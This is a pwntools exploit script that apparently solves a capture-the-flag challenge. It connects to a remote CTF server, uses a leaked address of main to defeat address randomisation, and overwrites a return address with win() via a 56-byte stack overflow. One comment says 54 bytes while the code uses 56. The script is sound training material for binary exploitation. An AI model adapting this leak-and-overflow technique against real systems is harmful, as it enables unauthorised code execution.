from pwn import *

EXE = ELF("./challenge/chall_6")

context.binary = EXE
context.terminal = ['xterm', '-e']
context.log_level = "DEBUG"

win_address_offset = EXE.symbols['win']
main_address_offset = EXE.symbols['main']

def conn(useExe=False):
	if useExe:
		# r = gdb.debug(EXE.path, "\n".join(breakpoints))
		r = process([EXE.path])
	else:
		r = remote('pwn.osucyber.club',13375)
	return r

io = conn(False)
# Wait for the process to send "One more time" and respond to move onto vuln()
io.recvline()
io.send(b'a\n')

# Wait for the process to send "Harder, better, faster, stronger: " then read the leaked address of main
# which is next on the same line.
io.recvuntil(b"Harder, better, faster, stronger: ")
data = io.recvline()[:-1] # ignore the last character of the input, which is a newline character
leaked_main_address = (int(data, 16))

# Now we use the leaked address to find the base address of the program, and use that to calculate the address of win
base_address = leaked_main_address - main_address_offset
win_address = base_address + win_address_offset

# Create a payload with an offset of 54 bytes then the address win(), send it, and open an 
# interactive terminal -- The system is 64 bit so we need a 64 bit pointer to the address of win()
payload = b'a'*56
payload += p64(win_address)+b'\n'
io.send(payload)
io.interactive()

io.close()